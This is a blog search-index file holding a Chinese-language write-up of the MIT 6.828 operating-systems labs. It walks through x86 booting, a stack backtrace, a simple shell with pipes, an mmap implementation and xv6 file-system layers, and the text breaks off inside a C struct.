<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>mit6.828 实验小结</title>
      <link href="/2020/02/22/mit6-828/"/>
      <url>/2020/02/22/mit6-828/</url>
      
        <content type="html"><![CDATA[<h2 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h2><p>　　这篇文章主要介绍 <a href="https://pdos.csail.mit.edu/6.828/2019/schedule.html" target="_blank" rel="noopener">mit6.828 实验</a> 的完成过程(不包含所有实验)以及在 6.828 中学到的一些知识点。以实验的完成为主线，中间穿插一些知识点，目的是为了更好地理解这个课程中的一些知识和理念。下面开始吧。<br>　　(前面第一个实验做的是 2018 的，后面才改为 2019 的)<br>　　这里先附上我的<a href="https://github.com/little-csd/mit6.828-2019-" target="_blank" rel="noopener">仓库</a>, 所有实验均完成. 每个任务对应在不同的分支当中. 查看每个分支增加的内容的话可以看每个分支和 xv6-riscv-fall19 分支的区别.</p><h2 id="Lab-Booting-a-PC"><a href="#Lab-Booting-a-PC" class="headerlink" title="Lab Booting a PC"></a>Lab Booting a PC</h2><p>　　既然要讲到操作系统，那么不可避免的要涉及电脑的启动的知识。显然完整的启动过程是及其复杂的，涉及到了大量的硬件和软件的知识，这里只能简单地了解到启动过程中的一些关键步骤。以 x86 CPU 在 BIOS 引导下的启动为例。</p><p>　　取 CPU 正式通电作为启动的开始，这个时候，CPU 将会 RESET 到一个初始状态，CP:IP 指向内存地址为 0xFFFF0 的位置，此时 CPU 运行于实模式下，能访问到的内存空间的大小仅 1M. 通常情况下，在该内存地址处存在一条跳转指令，指向 BIOS 的代码。</p><p>　　BIOS 在进行一些初始化操作后，寻找硬盘中的主引导记录，并将引导启动的代码复制到内存区域 0x7c00 到 0x7dff 当中(共 512 Byte，刚好一个扇区)。然后使用跳转指令跳转到启动的启动代码处，此时 BIOS 就相当与将系统的控制权转交给了操作系统的引导代码。</p><h3 id="Boot-Loader"><a href="#Boot-Loader" class="headerlink" title="Boot Loader"></a>Boot Loader</h3><p>　　在引导代码中，首先将 CPU 的中断关掉，然后设置各个数据段的值，读取段描述符，然后将 CR0 寄存器置为 1，即启动保护模式。此后 CPU 的寻址方式也发生了改变。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cli                         # Disable interrupts</span><br><span class="line"></span><br><span class="line"># Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">xorw    %ax,%ax             # Segment number zero</span><br><span class="line">movw    %ax,%ds             # -&gt; Data Segment</span><br><span class="line">movw    %ax,%es             # -&gt; Extra Segment</span><br><span class="line">movw    %ax,%ss             # -&gt; Stack Segment</span><br><span class="line">...</span><br><span class="line">lgdt    gdtdesc             # Load Global Descriptor Table</span><br><span class="line">movl    %cr0, %eax</span><br><span class="line">orl     $CR0_PE_ON, %eax</span><br><span class="line">movl    %eax, %cr0          # Set cr0 register</span><br></pre></td></tr></table></figure><p>　　切换到保护模式下后，CPU 要做的首先是各种段寄存器的设置，保证各个段对应的位置是正确的。此后跳转到 bootmain 函数，在这个函数中，操作系统的代码将从硬盘移动到内存当中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">bootmain(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// read 1st page off disk</span></span><br><span class="line">  <span class="comment">// param 1: destination</span></span><br><span class="line">  <span class="comment">// param 2: size</span></span><br><span class="line">  <span class="comment">// param 3: offset from kernel</span></span><br><span class="line">  readseg((<span class="keyword">uint32_t</span>) ELFHDR, SECTSIZE*<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// is this a valid ELF?</span></span><br><span class="line">  <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// load each program segment (ignores ph flags)</span></span><br><span class="line">  ph = (struct Proghdr *) ((<span class="keyword">uint8_t</span> *) ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">  eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">  <span class="keyword">for</span> (; ph &lt; eph; ph++)</span><br><span class="line">  <span class="comment">// p_pa is the load address of this segment (as well</span></span><br><span class="line">  <span class="comment">// as the physical address)</span></span><br><span class="line">  readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// call the entry point from the ELF header</span></span><br><span class="line">  <span class="comment">// note: does not return!</span></span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) (ELFHDR-&gt;e_entry))();</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>　　值得注意的一点是，由于此时还不存在操作系统，从硬盘读取文件仅能通过汇编代码实现(in 和 out 指令)，此处代码对硬盘中文件的读取做了一点简单的封装(readseg函数)。<br>　　JOS 操作系统本质上就是个 ELF 文件，存放在硬盘中的固定位置处，因此，我们将读取 ELF 文件头，就可以获得数据段和代码段等的位置和大小，并将其移动到内存中的固定位置，这样就实现了从磁盘到内存的搬运。此后，只需要从 ELF 文件中获取操作系统入口的地址，并调用入口的函数，就实现了将控制权转移到操作系统的步骤，操作系统开始准备启动。</p><h3 id="The-kernel"><a href="#The-kernel" class="headerlink" title="The kernel"></a>The kernel</h3><p>　　上面最后进入的 e-&gt;e_entry 对应的地址就是 entry.S 代码的开始。此处的代码是这样子的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Load the physical address of entry_pgdir into cr3.  entry_pgdir</span><br><span class="line"># is defined in entrypgdir.c.</span><br><span class="line">movl  $(RELOC(entry_pgdir)), %eax</span><br><span class="line">movl  %eax, %cr3</span><br><span class="line"># Turn on paging.</span><br><span class="line">movl  %cr0, %eax</span><br><span class="line">orl $(CR0_PE|CR0_PG|CR0_WP), %eax</span><br><span class="line">movl  %eax, %cr0</span><br><span class="line"># Now paging is enabled, but we&apos;re still running at a low EIP</span><br><span class="line"># (why is this okay?).  Jump up above KERNBASE before entering</span><br><span class="line"># C code.</span><br><span class="line">mov $relocated, %eax</span><br><span class="line">jmp *%eax</span><br><span class="line">relocated:</span><br><span class="line"># Clear the frame pointer register (EBP)</span><br><span class="line"># so that once we get into debugging C code,</span><br><span class="line"># stack backtraces will be terminated properly.</span><br><span class="line">movl  $0x0,%ebp   # nuke frame pointer</span><br><span class="line"># Set the stack pointer</span><br><span class="line">movl  $(bootstacktop),%esp</span><br><span class="line"># now to C code</span><br><span class="line">call  i386_init</span><br></pre></td></tr></table></figure><p>　　可以看到，首先开启了分页模式，也是从这里开始，内存的 [KERNBASE, KERNBASE+4MB) 映射到了 [0, 4MB)。然后，由于 IP 还停留在低地址处，在此处设置一个跳转使其跳到高地址。然后就是栈指针的设置。此处，通过查看汇编代码(使用 readelf 或 objdump 都可以)，可以知道，栈所在的位置是 0xf0108000 ~ 0xf0110000(不一定相同)。至于为什么此处 bootstacktop 的值是 0xf011000，可以通过 objdump -h 查看 kernel文件，恰好 data 段的开始就是 0xf0108000，加上段的大小是 32KB，因此栈顶就变成了 0xf0110000 了。然后，就跳转到了 i386_init 方法。</p><p>　　初始化代码是这样子的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">i386_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">extern</span> <span class="keyword">char</span> edata[], end[];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Before doing anything else, complete the ELF loading process.</span></span><br><span class="line">  <span class="comment">// Clear the uninitialized global data (BSS) section of our program.</span></span><br><span class="line">  <span class="comment">// This ensures that all static/global variables start out zero.</span></span><br><span class="line">  <span class="built_in">memset</span>(edata, <span class="number">0</span>, end - edata);</span><br><span class="line">  <span class="comment">// Initialize the console.</span></span><br><span class="line">  <span class="comment">// Can't call cprintf until after we do this!</span></span><br><span class="line">  cons_init();</span><br><span class="line">  <span class="comment">// Drop into the kernel monitor.</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    monitor(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　首先是进行一个 bss 段的清空操作。(bss 段在实际的 ELF 文件中仅仅存在段表，并没有实际占用任何磁盘空间)。然后，调用 cons_init 方法，在其中进行的是 cga 和 I/O 的一些初始化，具体细节可以不用管。到这里所有的初始化工作都完成了，程序可以正常运行。最后是一个死循环，不断调用 monitor 方法。在该方法中，循环读取用户的输入，并尝试执行用户输入的命令，即相当于一个简单的控制台。到这里整个程序的启动就基本结束。</p><h3 id="mon-backtrace-实现"><a href="#mon-backtrace-实现" class="headerlink" title="mon_backtrace 实现"></a>mon_backtrace 实现</h3><p>　　在实验中，要求我们实现一个简单的打印栈轨迹的方法。基本思路是利用汇编代码中，函数调用入口和出口出的典型形式(注意栈是往地址更小的方向伸展的，在下图表示法中则是向下):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push  ebp     # 旧栈基址入栈</span><br><span class="line">mov   ebp,esp # 设置新栈基址</span><br><span class="line">sub   esp,x   # 开辟栈空间</span><br><span class="line">push  regs... # 旧寄存器保存</span><br><span class="line"></span><br><span class="line">pop   regs... # 旧寄存器恢复</span><br><span class="line">mov   esp,ebp # 回收栈空间</span><br><span class="line">pop   ebp     # 旧栈基址恢复</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line"># 从上到下地址变小</span><br><span class="line"># ...</span><br><span class="line"># | eip1 |</span><br><span class="line"># | ebp1 |  &lt;- ebp0</span><br><span class="line"># | ...  |</span><br><span class="line"># | argv02 |</span><br><span class="line"># | argv01 |</span><br><span class="line"># | eip0 |</span><br><span class="line"># | ebp0 | &lt;- current ebp</span><br></pre></td></tr></table></figure><p>　　通过这样的特征，我们可以得到类似上面那样的栈结构，借助每个 ebp 存放的恰好是旧的 ebp 在栈中的位置这样的关系，形成了一个链表，我们可以打印出每个函数调用时的栈信息。边界是前面在刚刚进入保护模式的时候，ebp 的值为 0。以下是我的答案:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">mon_backtrace(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line">    cprintf(<span class="string">"Stack backtrace:\n"</span>);</span><br><span class="line">    <span class="keyword">int</span>* ebp = (<span class="keyword">int</span>*)read_ebp();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="keyword">while</span> (ebp) &#123;</span><br><span class="line">        <span class="keyword">int</span>* itr = ebp+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> eip = *(itr++);</span><br><span class="line">        <span class="keyword">int</span> argv1 = *(itr++);</span><br><span class="line">        <span class="keyword">int</span> argv2 = *(itr++);</span><br><span class="line">        <span class="keyword">int</span> argv3 = *(itr++);</span><br><span class="line">        <span class="keyword">int</span> argv4 = *(itr++);</span><br><span class="line">        <span class="keyword">int</span> argv5 = *(itr++);</span><br><span class="line">        cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>, ebp, eip, argv1, argv2, argv3, argv4, argv5);</span><br><span class="line">        ebp = (<span class="keyword">int</span>*)(*ebp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res = debuginfo_eip(eip, &amp;info);</span><br><span class="line">        <span class="keyword">if</span> (!res) &#123;</span><br><span class="line">            cprintf(<span class="string">"    %s:%d: %.*s+%d\n"</span>, info.eip_file, info.eip_line, info.eip_fn_namelen, info.eip_fn_name, (eip - info.eip_fn_addr));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Lab-Shell"><a href="#Lab-Shell" class="headerlink" title="Lab Shell"></a>Lab Shell</h2><p>　　shell 可以说是 linux 中和系统交互的窗口, 它读取我们输入的指令, 并进行解析和执行. shell 有很多个版本, 从比较古老的 sh, 到 csh, bash, zsh 等, 每个类型的 shell 都有其特色. 在这个实验中, 需要实现的就是一个简易的 shell. shell 的一般逻辑如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[MAXBUF];</span><br><span class="line"><span class="keyword">while</span> (readcmd(buf)) &#123; <span class="comment">// 读取命令</span></span><br><span class="line">  Command cmd = parse(buf); <span class="comment">// 解析命令</span></span><br><span class="line">  <span class="keyword">if</span> (fork() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    wait(<span class="number">0</span>);  <span class="comment">// 等待子进程</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    execute(cmd); <span class="comment">// 子进程执行命令</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"@"</span>); <span class="comment">// 打印 prompt</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　在这个实验中考察的主要是重定向和管道. 首先, linux 中, 一般初始进程有三个文件描述符: 0, 1, 2. 0 代表标准输入, 1 代表标准输出, 2 代表标准错误. 在编程中, 通常 scanf 就是从描述符 0 中读入的. 而重定向就是用来修改输入和输出的目的地的. 比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.c &gt; a.out</span><br></pre></td></tr></table></figure><p>　　‘&gt;’ 是输出重定向, 可以把执行 ‘cat file.c’ 的 1 号描述符从指向控制台变为指向 a.out 的文件. 结果就是 file.c 中的内容将会被输入到 a.out 文件中. 管道则是 linux 中的一种通信机制, 想象现实中的一条水管, 如果把数据看成是流动的水, 通过管道读写数据就像水流经水管一样. 并且, 水管是单向的, 一条水管中的只能从一边流向另一边, 管道也是如此. linux 中的 pipe 函数可以创建一个管道, 得到输入和输出的描述符. 利用这两个描述符, 就可以从管道中接受数据或发送数据. 不过一旦输入数据, 输出描述符将自动关闭, 反过来也是, 防止双向流动.</p><p>　　在实验中, 关于重定向有个很巧妙的写法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">redirect(<span class="keyword">int</span> d, <span class="keyword">int</span>* fd) &#123;</span><br><span class="line">    close(d); <span class="comment">// 关闭原先的输入/输出描述符(0/1)</span></span><br><span class="line">    dup(fd[d]); <span class="comment">// 复制描述符, 由于前面关闭了描述符, 根据描述符的分配原则, 这里 0/1 描述符将指向管道</span></span><br><span class="line">    close(fd[<span class="number">0</span>]); <span class="comment">// 关闭管道的两个描述符</span></span><br><span class="line">    close(fd[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　pipe 创建管道后, 当想更换输入描述符时, 调用 redirect(0, fd), 同理, 更换输出描述符时, 调用 redirect(1, fd). 下图就比较形象地展示了这个函数的功能</p><p><img src="/2020/02/22/mit6-828/pipe.png" alt="pipe"></p><p>　　利用这个函数, 我们可以很简单地实现 ‘&gt;’ 和 ‘&lt;’. 而遇到 ‘|’ 符号, 则可以将前后的指令分为两部分 s1 和 s2, fork 后子进程调用 redirect(1,fd) 操作, 然后执行 s1 部分的指令; 父进程则 redirect(0, fd) 后执行 s2 部分的指令(有可能递归) 即可. 伪代码如下(仅思路, 具体代码不建议这样写):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* cmd = ...;</span><br><span class="line"><span class="keyword">if</span> (cmd[i] == <span class="string">'|'</span>) &#123;</span><br><span class="line">  <span class="keyword">char</span>* s1 = cmd;</span><br><span class="line">  <span class="keyword">char</span>* s2 = cmd+i+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> pd[<span class="number">2</span>];</span><br><span class="line">  pipe(pd);</span><br><span class="line">  <span class="keyword">if</span> (fork() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    redirect(<span class="number">0</span>,pd);</span><br><span class="line">    execute(s2);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    redirect(<span class="number">1</span>,pd);</span><br><span class="line">    execute(s1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　写完后, make qemu 后, 调用 testsh nsh, 看到 passed all tests 则说明成功了.</p><h2 id="Lab-Mmap"><a href="#Lab-Mmap" class="headerlink" title="Lab Mmap"></a>Lab Mmap</h2><p>　　mmap 实验应该是所有实验里面代码量相对较大的一个, debug 起来也比较麻烦. 建议在这个实验中写好打印 mmap 用到的相关数据的函数, 便于后面的调试. 在该实验中, 需要实现 linux 中的 mmap 函数的简易版本, 用于将某个文件映射到内存空间上. 在该实验中, addr 和 offset 恒为 0. flags 只分为 SHARED 和 PRIVATE 两种, 对于 SHARED 类型的映射, 在 unmap 后需要写回原文件, 而 PRIVATE 则不需要写回.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure><p>　　和其他系统调用一样, 首先要做的是在 syscall.c 和 syscall.h 中添加 mmap 和 munmap 的系统调用号, 以及 usys.pl 中添加 entry. 这里我选择的是新建一个 mmap.c 文件, 在其中实现 mmap 相关的函数. 由于 mmap 是属于进程的, 为了便于对 mmap 映射区域的管理, 我添加了一个 vma 的结构体如下(写在了 proc.h 中). 结构体中包含每个映射区域的起始地址, 长度, flags, 映射的文件指针, 以链表的形式串联在一起. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma</span> &#123;</span></span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">int</span> len;</span><br><span class="line">  <span class="keyword">int</span> prot;</span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span>* <span class="title">f</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vma</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vma</span>* <span class="title">head</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　在 mmap.c 文件中, 首先需要对 vma 结构体进行管理. 这里选择用一个固定长度的空的 vma 数组用于分配, 添加 allocvma 和 freevma 进行分配和回收, 使用链表的形式将所有未用的 vma 串联在一起. 在 mmap 中按照以下的思路进行:</p><ol><li>检查参数的范围(比如 len &gt; 0)</li><li>检查权限问题. 比如一个不可读的文件不可能使用内存映射给用户访问, 应该返回异常. 或者一个不可写的文件, prot 标志区域可写并且 flags 标记为 MAP_SHARED(即会写回源文件) 也是有问题的.</li><li>调用 allocvma 获得一个空的 vma 结构体</li><li>搜索当前进程的页表, 找到一个空闲区域, 并将区域的首地址, 长度等信息填写进 vma 中, 并加入进程的 vma 链表</li><li>filedup 增加文件的引用数, 防止文件被提前回收</li></ol><p>　　munmap 的思路同样类似</p><ol><li>检查参数范围</li><li>从当前进程中查找到需要 unmap 的地址所在的 vma</li><li>如果有 MAP_SHARED 标识, 则写回. PTE_D(1&lt;&lt;7) 标志位表示页面被修改过</li><li>uvmunmap 将页面回收</li><li>如果 vma 对应的空间全部回收, 则关闭文件, 并将该 vma 从进程中除去</li></ol><p>　　这里有几个需要注意的点. 第一个是上面提到的权限问题的检查. 第二个是虚拟内存中空闲区域的查找, 需要注意空闲区域必须在当前页表中为空, 并且<strong>不能和其他空闲区域重叠</strong>, 否则会出现严重的问题. 此外, 由于使用了 lazy allocation, 要如何保证查找到的空闲区域不会被其他操作用到(虽然我没有进行额外的处理, 但可以通过测试). 第三个是 uvmunmap 需要进行对应的修改. 因为 lazy allocation, uvmunmap 的区域有可能实际上并没有分配到任何的物理内存, 这时候不应该 panic, 而是直接跳过.</p><p>　　在碰到缺页异常的时候, 需要先检查访问的地址是否位于 vma 当中, 如果是的话则需要分配一个新的物理页给进程, 并调用 mappages 进行地址的映射. 如果不在 vma 当中才触发 panic</p><p>　　最后 exit 和 fork 函数需要做适当的修改. 由于子进程继承了父进程的所有虚拟内存空间, mmap 的区域同样需要继承. 在 fork 结束前添加 vma 的复制函数, 将 vma 复制到新的进程当中即可.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma</span>* <span class="title">r</span> = <span class="title">p</span>-&gt;<span class="title">vmhead</span>;</span></span><br><span class="line">np-&gt;vmhead = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (r) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vma</span>* <span class="title">nr</span> = <span class="title">copyvma</span>(<span class="title">r</span>);</span> <span class="comment">// 注意 copyvma 中需要调用 filedup 增加引用数</span></span><br><span class="line">  nr-&gt;next = np-&gt;vmhead;</span><br><span class="line">  np-&gt;vmhead = nr;</span><br><span class="line">  r = r-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　同样的, exit 函数将所有 vma 依次释放. 但需要小心一个链表操作的问题, 比如下面的代码可能出现严重错误.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma</span>* <span class="title">r</span> = <span class="title">p</span>-&gt;<span class="title">vmhead</span>;</span> <span class="comment">// 进程的 vma 链表表头</span></span><br><span class="line"><span class="keyword">while</span> (r) &#123;</span><br><span class="line">  munmap((<span class="keyword">void</span>*)(r-&gt;addr), r-&gt;len);</span><br><span class="line">  r = r-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　表面看起来似乎没问题, 但是在 munmap 函数中, 由于将整个 vma 回收, 会修改到 vma 链表, 并且 r 将会被回收, r = r -&gt; next 是有问题的, 应该修改为 r = p -&gt; vmhead</p><h2 id="Lab-FileSystem"><a href="#Lab-FileSystem" class="headerlink" title="Lab FileSystem"></a>Lab FileSystem</h2><p>　　这里根据 6.828 官网中的 <a href="https://pdos.csail.mit.edu/6.828/2019/xv6/book-riscv-rev0.pdf" target="_blank" rel="noopener">book-riscv-rev0.pdf</a> 相关介绍, 讲下简单文件系统的实现.</p><p>　　6.828 中的文件系统和早期 Unix 系统比较类似, 整个文件系统大致分为七个层次, 下面按照层次模型进行分析, 给出每一层的作用以及和上下层的交互关系.(这里的分层并不是很严格, 跨层之间的调用是存在的)</p><p><img src="/2020/02/22/mit6-828/fs_layers.png" alt="fs_layers"></p><p>　　最底层是硬件层/汇编层, 直接和硬件进行接触. 对于上层而言, 它的作用是, 给定一个设备, 缓冲区以及需要读写的块号, 对硬件中对应的数据块进行读写. 对应于源文件中的 virtio_disk.c 文件. 通常这样一个层次包含了磁盘驱动程序以及对应的硬件. </p><p>　　上面一层是 Buffer 层, 顾名思义, 最直接的作用就是做缓存, 对于上层到来的所有读写请求进行缓存操作, 如果缓存中没有找到, 才向下一层也就是硬件层发出对应请求. 对应与源文件中的 bio.c 文件. 简单起见, xv6 采用的是 LRU(Least Recently Used) 的缓存策略. 这里是 buf 的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span> <span class="comment">// NBUF = 30</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span></span><br><span class="line">&#125; bcache;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buf</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> valid;   <span class="comment">// has data been read from disk?</span></span><br><span class="line">  <span class="keyword">int</span> disk;    <span class="comment">// does disk "own" buf?</span></span><br><span class="line">  uint dev;</span><br><span class="line">  uint blockno;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> <span class="title">lock</span>;</span></span><br><span class="line">  uint refcnt;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">prev</span>;</span> <span class="comment">// LRU cache list</span></span><br><span class="line">  <span class="class"><span 